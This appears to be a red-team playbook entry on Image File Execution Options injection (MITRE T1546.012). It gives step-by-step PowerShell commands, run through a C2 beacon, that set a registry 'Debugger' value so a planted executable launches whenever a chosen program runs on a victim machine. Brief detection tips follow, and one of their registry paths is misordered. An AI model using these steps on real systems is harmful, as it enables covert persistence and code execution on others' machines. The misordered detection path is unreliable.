# [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012/)

## Exploit Description: 
Executing malicious content triggered by Image File Execution Options

## Exploit syntax:
* \<posh syntax\>

1. Get a beacon with administrative privileges. 

2. Put a Executable you want to be ran on the victim box.

3. In parrot open a blank text file and paste the following commands into it. The "Name of key" Should be the Program that you want to imitate. -Value should be the Path to the executable on vitcims box.
    ```sh
	New-item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" -Name "Name of key"

	Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Name of key" -name "Debugger" -Value "Path to executable on victim"

    ```
4. Save the file as SomeCleverName.ps1 to /tmp

	
5.  In posh, run
    ```sh
	pslo /tmp/SomeCleverName.ps1
    ```
6. When the Program you made the registry key for is executed. The name of the key is passed to the Value(Path to the executable on victim) you supplied in the powershell script as an argument. Then that executable is ran.  



## Detection Technique:
* Monitor for abnormal usage of the GFlags tool as well as common processes spawned under abnormal parents and/or with creation flags indicative of debugging such as DEBUG_PROCESS and DEBUG_ONLY_THIS_PROCESS

* Monitor for any registry changes to HKLM\Software\Microsoft\CurrentVersion\Windows NT\Image File Execution Options\

## Resources
 [Image File Execution Options Explained](https://www.youtube.com/watch?v=-hz0PTVa0k4&t=182s)